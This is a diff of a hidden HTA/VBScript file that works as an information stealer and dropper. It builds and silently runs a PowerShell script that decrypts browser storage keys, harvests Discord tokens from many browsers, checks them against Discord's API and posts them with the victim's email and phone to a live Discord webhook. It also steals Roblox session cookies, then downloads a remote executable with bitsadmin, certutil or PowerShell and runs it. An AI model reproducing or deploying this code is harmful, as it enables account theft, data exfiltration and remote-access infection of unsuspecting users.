@@ -2,247 +2,222 @@
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
+window.resizeTo 0,0 : window.moveTo -2000,-2000
 On Error Resume Next
 
 Dim sh, fso, WH, PC, USER
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
+
 WH   = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-Call GrabDiscord
-Call GrabRoblox
-Call DropRAT
+Call GrabDiscord()
+Call GrabRoblox()
+Call DropRAT()
 
 window.close()
 
 ' ============================================================
-' DISCORD TOKEN GRABBER
+' DISCORD TOKEN GRABBER — PowerShell engine
 ' ============================================================
 
 Sub GrabDiscord()
-    Dim APPDATA:  APPDATA  = sh.ExpandEnvironmentStrings("%APPDATA%")
-    Dim LOCAL:    LOCAL    = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+    Dim psScript
+    psScript = _
+        "Add-Type -AssemblyName System.Security" & vbLf & _
+        "Add-Type -AssemblyName System.Web" & vbLf & _
+        "try { Add-Type -AssemblyName PresentationFramework } catch {}" & vbLf & _
+        "" & vbLf & _
+        "$WH = '" & WH & "'" & vbLf & _
+        "$PC = $env:COMPUTERNAME" & vbLf & _
+        "$USER = $env:USERNAME" & vbLf & _
+        "" & vbLf & _
+        "function Get-AESKey($path) {" & vbLf & _
+        "    try {" & vbLf & _
+        "        $ls = Join-Path $path 'Local State'" & vbLf & _
+        "        if (-not (Test-Path $ls)) { return $null }" & vbLf & _
+        "        $json = Get-Content $ls -Raw | ConvertFrom-Json" & vbLf & _
+        "        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)" & vbLf & _
+        "        $encKey = $encKey[5..($encKey.Length-1)]" & vbLf & _
+        "        return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')" & vbLf & _
+        "    } catch { return $null }" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "function Decrypt-Token($enc, $key) {" & vbLf & _
+        "    try {" & vbLf & _
+        "        if ($enc.Length -lt 15) { return $null }" & vbLf & _
+        "        $prefix = [System.Text.Encoding]::ASCII.GetString($enc[0..2])" & vbLf & _
+        "        if ($prefix -eq 'v10' -or $prefix -eq 'v11') {" & vbLf & _
+        "            $iv  = $enc[3..14]" & vbLf & _
+        "            $data = $enc[15..($enc.Length-17)]" & vbLf & _
+        "            $tag  = $enc[($enc.Length-16)..($enc.Length-1)]" & vbLf & _
+        "            Add-Type -TypeDefinition @'" & vbLf & _
+        "using System; using System.Security.Cryptography;" & vbLf & _
+        "public class AesGcm2 {" & vbLf & _
+        "    public static byte[] Decrypt(byte[] key,byte[] nonce,byte[] cipher,byte[] tag){" & vbLf & _
+        "        using(var aes=new System.Security.Cryptography.AesGcm(key)){" & vbLf & _
+        "            var plain=new byte[cipher.Length];" & vbLf & _
+        "            aes.Decrypt(nonce,cipher,tag,plain);" & vbLf & _
+        "            return plain;}}" & vbLf & _
+        "}" & vbLf & _
+        "'@ -ErrorAction SilentlyContinue" & vbLf & _
+        "            try {" & vbLf & _
+        "                $plain = [AesGcm2]::Decrypt($key,$iv,$data,$tag)" & vbLf & _
+        "                return [System.Text.Encoding]::UTF8.GetString($plain)" & vbLf & _
+        "            } catch { return $null }" & vbLf & _
+        "        }" & vbLf & _
+        "        return $null" & vbLf & _
+        "    } catch { return $null }" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "function Get-Tokens-From-LevelDB($ldbPath, $aesKey) {" & vbLf & _
+        "    $found = @()" & vbLf & _
+        "    $pattern = '(dQw4w9WgXcQ:[^.*\[""()*\]'']{10,}|mfa\.[a-zA-Z0-9_-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,28})'" & vbLf & _
+        "    if (-not (Test-Path $ldbPath)) { return $found }" & vbLf & _
+        "    Get-ChildItem $ldbPath -Include *.ldb,*.log -Recurse -ErrorAction SilentlyContinue | ForEach-Object {" & vbLf & _
+        "        try {" & vbLf & _
+        "            $bytes = [System.IO.File]::ReadAllBytes($_.FullName)" & vbLf & _
+        "            $text  = [System.Text.Encoding]::UTF8.GetString($bytes)" & vbLf & _
+        "            $matches = [regex]::Matches($text, $pattern)" & vbLf & _
+        "            foreach ($m in $matches) {" & vbLf & _
+        "                $val = $m.Value" & vbLf & _
+        "                if ($val.StartsWith('dQw4w9WgXcQ:')) {" & vbLf & _
+        "                    if ($aesKey) {" & vbLf & _
+        "                        $encB64  = $val.Split(':')[1]" & vbLf & _
+        "                        $encBytes = [Convert]::FromBase64String($encB64)" & vbLf & _
+        "                        $dec = Decrypt-Token $encBytes $aesKey" & vbLf & _
+        "                        if ($dec) { $found += $dec }" & vbLf & _
+        "                    }" & vbLf & _
+        "                } else {" & vbLf & _
+        "                    $found += $val" & vbLf & _
+        "                }" & vbLf & _
+        "            }" & vbLf & _
+        "        } catch {}" & vbLf & _
+        "    }" & vbLf & _
+        "    return $found" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "function Validate-Token($token) {" & vbLf & _
+        "    try {" & vbLf & _
+        "        $req = [System.Net.WebRequest]::Create('https://discord.com/api/v9/users/@me')" & vbLf & _
+        "        $req.Method = 'GET'" & vbLf & _
+        "        $req.Headers.Add('Authorization', $token)" & vbLf & _
+        "        $req.UserAgent = 'Mozilla/5.0'" & vbLf & _
+        "        $req.Timeout = 8000" & vbLf & _
+        "        $resp = $req.GetResponse()" & vbLf & _
+        "        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())" & vbLf & _
+        "        $json = $reader.ReadToEnd() | ConvertFrom-Json" & vbLf & _
+        "        $nitro = @('None','Nitro Classic','Nitro','Nitro Basic')[$json.premium_type]" & vbLf & _
+        "        return [PSCustomObject]@{" & vbLf & _
+        "            Token    = $token" & vbLf & _
+        "            Username = $json.username + '#' + $json.discriminator" & vbLf & _
+        "            ID       = $json.id" & vbLf & _
+        "            Email    = $json.email" & vbLf & _
+        "            Phone    = $json.phone" & vbLf & _
+        "            MFA      = $json.mfa_enabled" & vbLf & _
+        "            Nitro    = $nitro" & vbLf & _
+        "            Valid    = $true" & vbLf & _
+        "        }" & vbLf & _
+        "    } catch { return $null }" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "function Send-Webhook($url, $body) {" & vbLf & _
+        "    try {" & vbLf & _
+        "        $req = [System.Net.WebRequest]::Create($url)" & vbLf & _
+        "        $req.Method = 'POST'" & vbLf & _
+        "        $req.ContentType = 'application/json'" & vbLf & _
+        "        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)" & vbLf & _
+        "        $req.ContentLength = $bytes.Length" & vbLf & _
+        "        $s = $req.GetRequestStream()" & vbLf & _
+        "        $s.Write($bytes, 0, $bytes.Length)" & vbLf & _
+        "        $s.Close()" & vbLf & _
+        "        $req.GetResponse() | Out-Null" & vbLf & _
+        "    } catch {}" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "$LOCAL   = $env:LOCALAPPDATA" & vbLf & _
+        "$ROAMING = $env:APPDATA" & vbLf & _
+        "" & vbLf & _
+        "$targets = @{" & vbLf & _
+        "    'Discord'        = ""$ROAMING\Discord""" & vbLf & _
+        "    'Discord Canary' = ""$ROAMING\discordcanary""" & vbLf & _
+        "    'Discord PTB'    = ""$ROAMING\discordptb""" & vbLf & _
+        "    'Lightcord'      = ""$ROAMING\Lightcord""" & vbLf & _
+        "    'Chrome'         = ""$LOCAL\Google\Chrome\User Data""" & vbLf & _
+        "    'Chrome SxS'     = ""$LOCAL\Google\Chrome SxS\User Data""" & vbLf & _
+        "    'Edge'           = ""$LOCAL\Microsoft\Edge\User Data""" & vbLf & _
+        "    'Brave'          = ""$LOCAL\BraveSoftware\Brave-Browser\User Data""" & vbLf & _
+        "    'Opera'          = ""$ROAMING\Opera Software\Opera Stable""" & vbLf & _
+        "    'Opera GX'       = ""$ROAMING\Opera Software\Opera GX Stable""" & vbLf & _
+        "    'Vivaldi'        = ""$LOCAL\Vivaldi\User Data""" & vbLf & _
+        "    'Yandex'         = ""$LOCAL\Yandex\YandexBrowser\User Data""" & vbLf & _
+        "    'Torch'          = ""$LOCAL\Torch\User Data""" & vbLf & _
+        "    'Amigo'          = ""$LOCAL\Amigo\User Data""" & vbLf & _
+        "    'Kometa'         = ""$LOCAL\Kometa\User Data""" & vbLf & _
+        "    'Orbitum'        = ""$LOCAL\Orbitum\User Data""" & vbLf & _
+        "    'CentBrowser'    = ""$LOCAL\CentBrowser\User Data""" & vbLf & _
+        "    '7Star'          = ""$LOCAL\7Star\7Star\User Data""" & vbLf & _
+        "    'Sputnik'        = ""$LOCAL\Sputnik\Sputnik\User Data""" & vbLf & _
+        "    'Epic'           = ""$LOCAL\Epic Privacy Browser\User Data""" & vbLf & _
+        "    'Uran'           = ""$LOCAL\uCozMedia\Uran\User Data""" & vbLf & _
+        "    'Iridium'        = ""$LOCAL\Iridium\User Data""" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "$allTokens = [System.Collections.Generic.HashSet[string]]::new()" & vbLf & _
+        "" & vbLf & _
+        "foreach ($name in $targets.Keys) {" & vbLf & _
+        "    $base = $targets[$name]" & vbLf & _
+        "    if (-not (Test-Path $base)) { continue }" & vbLf & _
+        "    $aesKey = Get-AESKey $base" & vbLf & _
+        "    $ldbPath = Join-Path $base 'Default\Local Storage\leveldb'" & vbLf & _
+        "    $tokens = Get-Tokens-From-LevelDB $ldbPath $aesKey" & vbLf & _
+        "    foreach ($t in $tokens) { $allTokens.Add($t) | Out-Null }" & vbLf & _
+        "    # also scan Discord client local storage directly" & vbLf & _
+        "    $discordLS = Join-Path $base 'Local Storage\leveldb'" & vbLf & _
+        "    $tokens2 = Get-Tokens-From-LevelDB $discordLS $aesKey" & vbLf & _
+        "    foreach ($t in $tokens2) { $allTokens.Add($t) | Out-Null }" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "if ($allTokens.Count -eq 0) {" & vbLf & _
+        "    $body = '{""embeds"":[{""title"":""Discord Token"",""description"":""No tokens found"",""color"":16711680,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
+        "    Send-Webhook $WH $body" & vbLf & _
+        "    exit" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "$results = @()" & vbLf & _
+        "foreach ($tok in $allTokens) {" & vbLf & _
+        "    $info = Validate-Token $tok" & vbLf & _
+        "    if ($info) { $results += $info }" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "if ($results.Count -eq 0) {" & vbLf & _
+        "    $raw = ($allTokens | ForEach-Object { $_ }) -join ""`n""" & vbLf & _
+        "    $body = '{""embeds"":[{""title"":""Discord Token"",""description"":""Found ' + $allTokens.Count + ' candidate(s) unvalidated\n\n' + ($raw -replace '""','') + '"",""color"":16776960,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
+        "    Send-Webhook $WH $body" & vbLf & _
+        "    exit" & vbLf & _
+        "}" & vbLf & _
+        "" & vbLf & _
+        "foreach ($r in $results) {" & vbLf & _
+        "    $desc  = ""**Token:** \`\`\`$($r.Token)\`\`\`\n"" +" & vbLf & _
+        "             ""**User:** $($r.Username)\n"" +" & vbLf & _
+        "             ""**ID:** $($r.ID)\n"" +" & vbLf & _
+        "             ""**Email:** $($r.Email)\n"" +" & vbLf & _
+        "             ""**Phone:** $($r.Phone)\n"" +" & vbLf & _
+        "             ""**MFA:** $($r.MFA)\n"" +" & vbLf & _
+        "             ""**Nitro:** $($r.Nitro)""" & vbLf & _
+        "    $desc  = $desc -replace '""','\\""'" & vbLf & _
+        "    $body  = '{""embeds"":[{""title"":""✅ Discord Token Valid"",""description"":""' + $desc + '"",""color"":65280,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
+        "    Send-Webhook $WH $body" & vbLf & _
+        "}"
 
-    ' Discord app paths (leveldb)
-    Dim discordPaths(6)
-    discordPaths(0) = APPDATA & "\discord\Local Storage\leveldb"
-    discordPaths(1) = APPDATA & "\discordcanary\Local Storage\leveldb"
-    discordPaths(2) = APPDATA & "\discordptb\Local Storage\leveldb"
-    discordPaths(3) = APPDATA & "\Discord\Local Storage\leveldb"
-    discordPaths(4) = APPDATA & "\DiscordCanary\Local Storage\leveldb"
-    discordPaths(5) = APPDATA & "\DiscordPTB\Local Storage\leveldb"
-    discordPaths(6) = LOCAL  & "\Discord\User Data\Default\Local Storage\leveldb"
-
-    ' Browser leveldb paths
-    Dim browserPaths(7)
-    browserPaths(0) = LOCAL & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
-    browserPaths(1) = LOCAL & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
-    browserPaths(2) = LOCAL & "\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
-    browserPaths(3) = LOCAL & "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
-    browserPaths(4) = APPDATA & "\Opera Software\Opera Stable\Local Storage\leveldb"
-    browserPaths(5) = APPDATA & "\Opera Software\Opera GX Stable\Local Storage\leveldb"
-    browserPaths(6) = LOCAL & "\Vivaldi\User Data\Default\Local Storage\leveldb"
-    browserPaths(7) = LOCAL & "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
-
-    Dim allTokens: allTokens = ""
-    Dim seen:      seen      = "|"
-    Dim re
-    Set re = New RegExp
-    re.Global   = True
-    re.MultiLine = True
-
-    ' New token format (bot tokens + user tokens)
-    Dim patterns(2)
-    patterns(0) = "[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"
-    patterns(1) = "[\w-]{24}\.[\w-]{6}\.[\w-]{38}"
-    patterns(2) = "mfa\.[A-Za-z0-9_-]{84}"
-
-    Dim i, j, path, folder, file, content, matches, match
-
-    ' Scan Discord app leveldb
-    For i = 0 To 6
-        path = discordPaths(i)
-        If fso.FolderExists(path) Then
-            Set folder = fso.GetFolder(path)
-            For Each file In folder.Files
-                Dim ext: ext = LCase(fso.GetExtensionName(file.Name))
-                If ext = "ldb" Or ext = "log" Or ext = "ldb" Then
-                    content = SafeReadFile(file.Path)
-                    If Len(content) > 0 Then
-                        For j = 0 To 2
-                            re.Pattern = patterns(j)
-                            Set matches = re.Execute(content)
-                            For Each match In matches
-                                Dim tok: tok = match.Value
-                                If InStr(seen, "|" & tok & "|") = 0 Then
-                                    seen      = seen & tok & "|"
-                                    allTokens = allTokens & tok & vbLf
-                                End If
-                            Next
-                        Next
-                    End If
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    Next
-
-    ' Scan browser leveldb
-    For i = 0 To 7
-        path = browserPaths(i)
-        If fso.FolderExists(path) Then
-            Set folder = fso.GetFolder(path)
-            For Each file In folder.Files
-                ext = LCase(fso.GetExtensionName(file.Name))
-                If ext = "ldb" Or ext = "log" Then
-                    content = SafeReadFile(file.Path)
-                    If Len(content) > 0 Then
-                        For j = 0 To 2
-                            re.Pattern = patterns(j)
-                            Set matches = re.Execute(content)
-                            For Each match In matches
-                                tok = match.Value
-                                If InStr(seen, "|" & tok & "|") = 0 Then
-                                    seen      = seen & tok & "|"
-                                    allTokens = allTokens & tok & vbLf
-                                End If
-                            Next
-                        Next
-                    End If
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    Next
-
-    ' Also check discord local storage sqlite/json files
-    Dim jsonPaths(1)
-    jsonPaths(0) = APPDATA & "\discord\Local Storage"
-    jsonPaths(1) = APPDATA & "\Discord\Local Storage"
-    For i = 0 To 1
-        If fso.FolderExists(jsonPaths(i)) Then
-            Set folder = fso.GetFolder(jsonPaths(i))
-            For Each file In folder.Files
-                content = SafeReadFile(file.Path)
-                If Len(content) > 0 Then
-                    For j = 0 To 2
-                        re.Pattern = patterns(j)
-                        Set matches = re.Execute(content)
-                        For Each match In matches
-                            tok = match.Value
-                            If InStr(seen, "|" & tok & "|") = 0 Then
-                                seen      = seen & tok & "|"
-                                allTokens = allTokens & tok & vbLf
-                            End If
-                        Next
-                    Next
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    Next
-
-    Set re = Nothing
-
-    ' Validate tokens against Discord API and send
-    If Len(Trim(allTokens)) = 0 Then
-        Call PostEmbed("Discord Token", "No tokens found", 16711680)
-        Exit Sub
-    End If
-
-    Dim tokenList: tokenList = Split(Trim(allTokens), vbLf)
-    Dim validTokens: validTokens = ""
-    Dim t
-
-    For Each t In tokenList
-        t = Trim(t)
-        If Len(t) > 20 Then
-            Dim info: info = ValidateDiscordToken(t)
-            If Len(info) > 0 Then
-                validTokens = validTokens & info & vbLf & String(40, "-") & vbLf
-            End If
-        End If
-    Next
-
-    If Len(Trim(validTokens)) = 0 Then
-        ' send raw anyway — token might still be usable
-        Call PostEmbed("Discord Token", "Found " & UBound(tokenList)+1 & " candidate(s) — unvalidated", 16776960)
-        Call PostFile("discord_tokens.txt", allTokens)
-    Else
-        Call PostEmbed("Discord Token", "✅ Valid token(s) found!" & vbLf & vbLf & Left(validTokens, 900), 65280)
-        Call PostFile("discord_tokens.txt", validTokens & vbLf & "--- RAW ---" & vbLf & allTokens)
-    End If
+    ' write ps1 to temp and execute silently
+    Dim psPath: psPath = TmpFile("dztk.ps1")
+    WriteFile psPath, psScript
+    RunCmd "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """"
+    fso.DeleteFile psPath, True
 End Sub
-
-Function ValidateDiscordToken(token)
-    ValidateDiscordToken = ""
-    On Error Resume Next
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", "https://discord.com/api/v9/users/@me", False
-    h.SetRequestHeader "Authorization", token
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    h.Send
-    If h.Status = 200 Then
-        Dim resp: resp = h.ResponseText
-        ' parse basic fields manually (no JSON parser in VBS)
-        Dim uname: uname = JsonVal(resp, "username")
-        Dim uid:   uid   = JsonVal(resp, "id")
-        Dim email: email = JsonVal(resp, "email")
-        Dim phone: phone = JsonVal(resp, "phone")
-        Dim mfa:   mfa   = JsonVal(resp, "mfa_enabled")
-        Dim nitro: nitro = JsonVal(resp, "premium_type")
-        Dim ntype: ntype = "None"
-        If nitro = "1" Then ntype = "Nitro Classic"
-        If nitro = "2" Then ntype = "Nitro"
-        If nitro = "3" Then ntype = "Nitro Basic"
-        ValidateDiscordToken = "Token: " & token & vbLf & _
-                               "Username: " & uname & vbLf & _
-                               "ID: " & uid & vbLf & _
-                               "Email: " & email & vbLf & _
-                               "Phone: " & phone & vbLf & _
-                               "MFA: " & mfa & vbLf & _
-                               "Nitro: " & ntype
-    End If
-    Set h = Nothing
-End Function
-
-Function JsonVal(json, key)
-    JsonVal = ""
-    On Error Resume Next
-    Dim pattern: pattern = """" & key & """[  ]*:[  ]*""?([^"",}]+)""?"
-    Dim re: Set re = New RegExp
-    re.Pattern = """" & key & """[^:]*:[^""]*""([^""]+)"""
-    re.Global  = False
-    Dim m: Set m = re.Execute(json)
-    If m.Count > 0 Then JsonVal = m(0).SubMatches(0)
-    Set re = Nothing
-    If Len(JsonVal) = 0 Then
-        ' try unquoted (bool/number)
-        Set re = New RegExp
-        re.Pattern = """" & key & """[^:]*:[ ]*([^,}]+)"
-        re.Global  = False
-        Set m = re.Execute(json)
-        If m.Count > 0 Then JsonVal = Trim(m(0).SubMatches(0))
-        Set re = Nothing
-    End If
-End Function
-
-Function SafeReadFile(path)
-    SafeReadFile = ""
-    On Error Resume Next
-    Dim f: Set f = fso.OpenTextFile(path, 1, False)
-    If Err.Number = 0 Then
-        SafeReadFile = f.ReadAll
-        f.Close
-    End If
-    Err.Clear
-    Set f = Nothing
-End Function
 
 ' ============================================================
 ' ROBLOX COOKIE GRABBER
@@ -253,12 +228,14 @@ Sub GrabRoblox()
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
     paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%")      & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%")  & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+
     Dim i, fp, raw
     For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
     Next
+
     If Len(fp) = 0 Then
         Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
         If fso.FolderExists(pk) Then
@@ -267,17 +244,22 @@ Sub GrabRoblox()
             For Each subf In folder.SubFolders
                 If InStr(subf.Name, "ROBLOX") > 0 Then
                     Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp: Exit For
+                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                 End If
             Next
             Set folder = Nothing
         End If
     End If
-    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+
+    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680) : Exit Sub
+
     raw = ReadFile(fp)
-    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
-    Dim cookie: cookie = "": Dim approach: approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680) : Exit Sub
+
+    Dim cookie: cookie = "" : Dim approach: approach = ""
+
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw : approach = "Plaintext"
+
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
         approach = "JSON-DPAPI"
         Dim sp: sp = InStr(raw, "CookiesData"":""")
@@ -288,20 +270,24 @@ Sub GrabRoblox()
                 Dim b64: b64 = Mid(raw, sp, ep - sp)
                 If Len(b64) > 100 Then
                     cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                    If Len(cookie) = 0 Then cookie = b64 : approach = "JSON-Raw"
                 End If
             End If
         End If
     End If
+
     If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
         approach = "Raw-ROBLOSECURITY"
         Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
         cookie = Mid(raw, rp)
     End If
-    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+
+    If Len(cookie) = 0 Then cookie = raw : approach = "RawFile"
+
     Dim cae: cae = InStr(cookie, "|$CAE")
     If cae = 0 Then cae = InStr(cookie, "|_CAE")
     If cae > 0 Then cookie = Mid(cookie, cae)
+
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
     Call PostFile("cookie.txt", cookie)
 End Sub
@@ -313,18 +299,22 @@ End Sub
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
     Dim dl:   dl   = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"
+
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
+
     If Not fso.FileExists(temp) Then
         sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
     End If
+
     If fso.FileExists(temp) Then sh.Run Chr(34) & temp & Chr(34), 0, False
 End Sub
 
 ' ============================================================
-' DPAPI DECRYPT
+' DPAPI
 ' ============================================================
 
 Function DecryptDPAPI(b64)
@@ -387,17 +377,6 @@ Function ReadFile(path)
     Set f = Nothing
 End Function
 
-Function Fetch(url)
-    Fetch = ""
-    On Error Resume Next
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", url, False
-    h.Send
-    If h.Status = 200 Then Fetch = h.ResponseText
-    Set h = Nothing
-End Function
-
 Sub PostEmbed(t, d, c)
     On Error Resume Next
     Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
@@ -424,8 +403,8 @@ Sub PostFile(fn, ct)
 End Sub
 
 Function Ej(s)
-    s = Replace(s, "\",  "\\")
-    s = Replace(s, """", "\""")
+    s = Replace(s, "\",   "\\")
+    s = Replace(s, """",  "\""")
     s = Replace(s, vbCrLf, "\n")
     s = Replace(s, vbCr,   "\n")
     s = Replace(s, vbLf,   "\n")
